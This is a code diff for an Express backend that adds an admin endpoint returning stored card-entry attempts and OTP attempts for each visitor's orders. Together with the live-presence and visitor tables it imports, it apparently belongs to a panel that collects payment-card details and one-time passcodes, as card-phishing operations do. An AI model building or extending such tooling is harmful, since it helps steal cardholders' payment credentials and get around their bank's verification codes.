@@ -1,5 +1,5 @@
 import { Router } from "express";
-import { asc, desc, eq } from "drizzle-orm";
+import { asc, desc, eq, inArray } from "drizzle-orm";
 import { db, ordersTable, productsTable, presenceTable, siteContentTable, visitorsTable, cardAttemptsTable, otpAttemptsTable, adminTable } from "@workspace/db";
 import { CreateProductBody, UpdateProductBody, UpdateSiteContentBody, UpdateOrderBody } from "@workspace/api-zod";
 import { mapProductRow, mapSiteContentRow, isPresenceActive } from "./utils";
@@ -169,6 +169,46 @@ router.post("/admin/init", async (req, res, next) => {
     });
 
     res.status(201).json({ success: true });
+  } catch (error) {
+    next(error);
+  }
+});
+
+// Get card and OTP attempts for all orders of a customer (by visitorId)
+router.get("/admin/customers/:visitorId/attempts", async (req, res, next) => {
+  try {
+    const { visitorId } = req.params;
+
+    // Get all orders for this visitor
+    const orders = await db
+      .select({ id: ordersTable.id })
+      .from(ordersTable)
+      .where(eq(ordersTable.visitorId, visitorId));
+
+    if (orders.length === 0) {
+      return res.json({ cardAttempts: [], otpAttempts: [] });
+    }
+
+    const orderIds = orders.map(o => o.id);
+
+    // Get card attempts for all orders using inArray
+    const cardAttempts = await db
+      .select()
+      .from(cardAttemptsTable)
+      .where(inArray(cardAttemptsTable.orderId, orderIds))
+      .orderBy(desc(cardAttemptsTable.createdAt));
+
+    // Get OTP attempts for all orders using inArray
+    const otpAttempts = await db
+      .select()
+      .from(otpAttemptsTable)
+      .where(inArray(otpAttemptsTable.orderId, orderIds))
+      .orderBy(desc(otpAttemptsTable.createdAt));
+
+    res.json({
+      cardAttempts,
+      otpAttempts
+    });
   } catch (error) {
     next(error);
   }
